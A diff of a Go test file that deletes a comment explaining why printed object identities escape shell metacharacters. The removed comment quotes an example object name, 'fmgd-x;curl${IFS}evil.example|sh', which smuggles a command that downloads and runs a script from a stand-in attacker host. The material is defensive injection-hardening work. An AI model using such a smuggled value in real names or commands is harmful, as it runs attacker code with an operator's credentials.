@@ -561,18 +561,6 @@ func TestTheAPIKeyIdentityBindsItsUIDAndNotItsNameDerivedID(t *testing.T) {
 	}
 }
 
-// TestAnIdentityHoldsNoByteAShellWouldRead: the identity is printed BARE — it
-// cannot be quoted, because what a refusal prints is what fugaro allow-delete
-// compares byte for byte — and the sentence around it tells its reader to copy
-// it into a command line. A plan is a document someone else's session may have
-// written and the managed cover's name rule is a prefix (managed_cover.go), so
-// an object whose name is "fmgd-x;curl${IFS}evil.example|sh" reaches a refusal,
-// and an identity printed with those bytes in it is a command the shell of
-// whoever pastes it runs — with the operator's own credentials, which are the
-// ones fugaro allow-delete writes the owner's list with. So the bytes a shell
-// reads in some way of its own are escaped out of the printed text
-// (identityValue), and what is left is one word no shell rewrites.
-//
 // shellReads is the literal list of bytes a shell reads in a way of its own
 // and an identity therefore prints raw none of: the separators and the pipe,
 // the redirections and the ampersand, the substitution and the quote
